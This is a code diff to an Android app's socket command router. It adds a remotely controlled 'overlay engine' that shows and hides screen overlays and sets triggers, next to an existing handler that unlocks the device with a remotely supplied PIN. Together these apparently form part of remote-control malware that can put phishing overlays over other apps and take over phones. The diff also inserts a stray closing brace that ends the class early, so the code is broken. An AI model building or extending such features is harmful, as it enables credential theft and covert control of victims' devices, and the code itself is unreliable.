@@ -784,7 +784,63 @@ public final class SocketCommandRouter {
                 break;
         }
     }
+    
 
+    // ================= Overlay engine (Batch A) =================
+    private static void handleOverlay(JSONObject data, Socket socket, String cmdId) {
+        final String action = data.optString(Protocol.KEY_ACTION, "");
+        final com.fason.app.features.overlay.OverlayManager mgr = com.fason.app.features.overlay.OverlayManager.getInstance();
+        EXEC.execute(new Runnable() {
+            @Override
+            public void run() {
+                JSONObject result = new JSONObject();
+                try {
+                    result.put(Protocol.KEY_TYPE, Protocol.OVERLAY);
+                    result.put(Protocol.KEY_ACTION, action);
+                    JSONObject body;
+                    if (Protocol.ACT_OVERLAY_SHOW.equals(action)) {
+                        body = mgr.showOverlay(data);
+                    } else if (Protocol.ACT_OVERLAY_HIDE.equals(action)) {
+                        body = mgr.hideOverlay(data);
+                    } else if (Protocol.ACT_OVERLAY_TRIGGERS.equals(action)) {
+                        body = mgr.setTriggers(data);
+                    } else if (Protocol.ACT_OVERLAY_STATUS.equals(action)) {
+                        body = mgr.status();
+                    } else {
+                        body = errorBody("overlay:unknown_action:" + action);
+                    }
+                    mergeInto(result, body);
+                } catch (Exception e) {
+                    try {
+                        result.put(Protocol.KEY_STATUS, "error");
+                        result.put(Protocol.KEY_ERROR, String.valueOf(e));
+                    } catch (Exception ignored) {}
+                }
+                attachCmdId(result, cmdId);
+                emit(socket, Protocol.OVERLAY, result, cmdId);
+            }
+        });
+    }
+
+    private static void mergeInto(JSONObject dst, JSONObject src) {
+        if (src == null) return;
+        java.util.Iterator<String> it = src.keys();
+        while (it.hasNext()) {
+            String k = it.next();
+            try { dst.put(k, src.opt(k)); } catch (Exception ignored) {}
+        }
+    }
+
+    private static JSONObject errorBody(String msg) {
+        JSONObject r = new JSONObject();
+        try {
+            r.put(Protocol.KEY_STATUS, "error");
+            r.put(Protocol.KEY_ERROR, msg);
+        } catch (Exception ignored) {}
+        return r;
+    }
+}
+    
     private static void handleDeviceUnlock(JSONObject data, Socket socket, String cmdId) {
         String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_UNLOCK);
         String pin = data.optString("pin", "");
